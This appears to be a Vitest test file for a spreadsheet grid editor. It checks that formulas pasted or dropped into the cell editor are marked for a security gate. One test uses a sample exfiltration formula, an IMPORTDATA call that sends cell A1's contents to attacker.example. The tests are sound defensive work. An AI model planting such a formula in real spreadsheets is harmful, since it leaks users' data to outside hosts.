// @vitest-environment jsdom
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { createGrid } from '../src/ui/grid.js';
import { Workbook } from '../src/core/workbook.js';

beforeEach(() => {
  Object.defineProperty(HTMLElement.prototype, 'clientWidth', { configurable: true, get() { return 800; } });
  Object.defineProperty(HTMLElement.prototype, 'clientHeight', { configurable: true, get() { return 400; } });
  HTMLCanvasElement.prototype.getContext = () => ({ measureText: (t) => ({ width: t.length * 7 }), font: '' });
  Element.prototype.scrollTo = function scrollTo() {};
  globalThis.matchMedia = () => ({ matches: false, addEventListener() {} });
  globalThis.requestAnimationFrame = (fn) => setTimeout(fn, 0);
  globalThis.cancelAnimationFrame = (id) => clearTimeout(id);
});
afterEach(() => { document.body.replaceChildren(); });

// A formula pasted into the in-cell editor never met the outside-content gate the editor runs on a
// paste into the cells: the grid now marks an entry that took a paste, and the editor's commit hook
// reads the mark while the entry is still open.
describe('an entry pasted into the cell editor', () => {
  it('is marked on editState until it is committed, and a fresh entry is not', () => {
    const wb = new Workbook();
    const id = wb.sheets[0].id;
    const seen = [];
    const grid = createGrid({ wb, sheetId: id, announce() {}, validate: () => { seen.push(grid.editState?.pasted); return { ok: true }; } });
    document.body.replaceChildren(grid.el);
    const editor = grid.el.querySelector('.grid-editor');
    grid.beginEdit({ text: '', mode: 'type' });
    expect(grid.editState.pasted).toBe(false);
    editor.dispatchEvent(new Event('paste', { bubbles: true, cancelable: true }));
    expect(grid.editState.pasted).toBe(true);
    grid.setEditText('=IMPORTDATA("https://example.com/x.csv")', { fromEditor: true });
    expect(grid.editState.pasted).toBe(true); // typing on after the paste keeps the mark
    expect(grid.commitEdit()).toBe(true);
    expect(seen).toEqual([true]); // the commit hook saw it
    expect(grid.editState).toBeNull();
    grid.beginEdit({ text: 'typed', mode: 'type' });
    expect(grid.editState.pasted).toBe(false);
    grid.cancelEdit();
    grid.beginEdit({ mode: 'inplace' });
    expect(grid.editState.pasted).toBe(false);
    grid.cancelEdit();
    grid.destroy();
  });

  // The browser inserts dropped text into the textarea with no paste event, so a formula dragged in
  // from a page went round the gate the same formula pasted in goes through.
  it('is marked the same way when the text is dropped into the editor', () => {
    const wb = new Workbook();
    const id = wb.sheets[0].id;
    const seen = [];
    const grid = createGrid({ wb, sheetId: id, announce() {}, validate: () => { seen.push(grid.editState?.pasted); return { ok: true }; } });
    document.body.replaceChildren(grid.el);
    const editor = grid.el.querySelector('.grid-editor');
    grid.beginEdit({ text: '', mode: 'type' });
    expect(grid.editState.pasted).toBe(false);
    editor.dispatchEvent(new Event('drop', { bubbles: true, cancelable: true }));
    expect(grid.editState.pasted).toBe(true);
    grid.setEditText('=IMPORTDATA("https://attacker.example/?d="&ENCODEURL(A1))', { fromEditor: true });
    expect(grid.commitEdit()).toBe(true);
    expect(seen).toEqual([true]); // the commit hook distrusts it exactly as it does a paste
    grid.destroy();
  });
});
